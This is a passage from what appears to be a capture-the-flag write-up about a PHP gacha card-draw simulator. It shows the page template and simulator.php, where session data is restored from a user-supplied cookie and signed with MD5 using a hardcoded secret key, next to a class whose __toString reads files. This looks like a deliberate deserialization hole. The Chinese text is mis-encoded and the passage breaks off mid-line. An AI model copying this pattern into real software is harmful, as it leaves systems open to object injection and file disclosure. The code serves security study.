attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/css/cover.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-center<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>d-flex w-100 h-100 p-3 mx-auto flex-column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mastfoot mt-auto<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>éé…‹è¯æ˜å™¨<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">height</span><span class="token punctuation">:</span> 85%</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card own<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card-header<span class="token punctuation">"</span></span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> blue</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>æŠ½ä¸­çš„å…­æ˜Ÿå¹²å‘˜<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card-body<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>                        <span class="token variable">$legendary</span> <span class="token operator">=</span> <span class="token variable">$simulator</span><span class="token operator">-&gt;</span><span class="token function">getLegendary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$legendary</span> <span class="token keyword">as</span> <span class="token variable">$worker</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p class='legendary'&gt;"</span><span class="token operator">.</span><span class="token variable">$worker</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$worker</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p&gt;"</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token delimiter important">?&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card col-md-3<span class="token punctuation">"</span></span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #007bff<span class="token punctuation">;</span>width=100%<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card-header<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>åˆ€å®¢å¡”ï¼Œä½ è¦è€å©†ä¸è¦ï¼Ÿ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card-body<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$cards</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h5 class=\"card-title\"&gt;æŠ½å¡ç»“æœï¼š&lt;/h5&gt;"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$cards</span> <span class="token keyword">as</span> <span class="token variable">$card</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$card</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"stars"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                            <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>                                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p class='normal'&gt;"</span><span class="token operator">.</span><span class="token variable">$card</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"card"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"star"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$card</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"card"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$card</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"card"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p&gt;"</span><span class="token punctuation">;</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>                                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p class='rare'&gt;"</span><span class="token operator">.</span><span class="token variable">$card</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"card"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"star"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$card</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"card"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$card</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"card"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p&gt;"</span><span class="token punctuation">;</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>                                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p class='epic'&gt;"</span><span class="token operator">.</span><span class="token variable">$card</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"card"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"star"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$card</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"card"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$card</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"card"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p&gt;"</span><span class="token punctuation">;</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>                                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p class='legendary'&gt;"</span><span class="token operator">.</span><span class="token variable">$card</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"card"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"star"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$card</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"card"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$card</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"card"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p&gt;"</span><span class="token punctuation">;</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    <span class="token delimiter important">?&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>draw<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>æŠ½ä¸€æ¬¡<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>draw<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>è¿è¿è¿è¿è¿è¿è¿è¿è¿è¿!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mastfoot mt-auto<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Made by 109å‘æŠ½ä¸åˆ°<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>del</span><span class="token punctuation">&gt;</span></span>è€å©†<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>del</span><span class="token punctuation">&gt;</span></span>å¤•çš„<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">&gt;</span></span>R4u<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">&gt;</span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre><p><code>simulator.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Simulator</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$session</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cardsPool</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">session</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"session"</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">session</span><span class="token operator">-&gt;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"session"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cardsPool</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CardsPool</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./pool.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cardsPool</span><span class="token operator">-&gt;</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">draw</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token variable">$count</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$card</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cardsPool</span><span class="token operator">-&gt;</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$card</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"stars"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">session</span><span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$card</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"No"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$card</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">session</span><span class="token operator">-&gt;</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getLegendary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$six</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">session</span><span class="token operator">-&gt;</span><span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$six</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cardsPool</span><span class="token operator">-&gt;</span><span class="token property">cards</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$item</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$six</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">CardsPool</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$cards</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$filePath</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Cards pool file doesn't exist!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$rand</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$level</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$rand</span> <span class="token operator">&gt;=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$rand</span> <span class="token operator">&lt;=</span> <span class="token number">42</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$level</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$rand</span> <span class="token operator">&gt;=</span> <span class="token number">43</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$rand</span> <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$level</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$rand</span> <span class="token operator">&gt;=</span> <span class="token number">91</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$rand</span> <span class="token operator">&lt;=</span> <span class="token number">99</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$level</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$rand</span> <span class="token operator">==</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$level</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$rand_key</span> <span class="token operator">=</span> <span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cards</span><span class="token punctuation">[</span><span class="token variable">$level</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string double-quoted-string">"stars"</span> <span class="token operator">=&gt;</span> <span class="token variable">$level</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"No"</span> <span class="token operator">=&gt;</span> <span class="token variable">$rand_key</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"card"</span> <span class="token operator">=&gt;</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cards</span><span class="token punctuation">[</span><span class="token variable">$level</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$rand_key</span><span class="token punctuation">]</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cards</span> <span class="token operator">=</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Session</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$sessionData</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">SECRET_KEY</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"7tH1PKviC9ncELTA1fPysf6NYq7z7IA9"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sessionData</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sessionData</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sessionData</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$serialized</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sessionData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sign</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$serialized</span> <span class="token operator">.</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">SECRET_KEY</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$serialized</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string 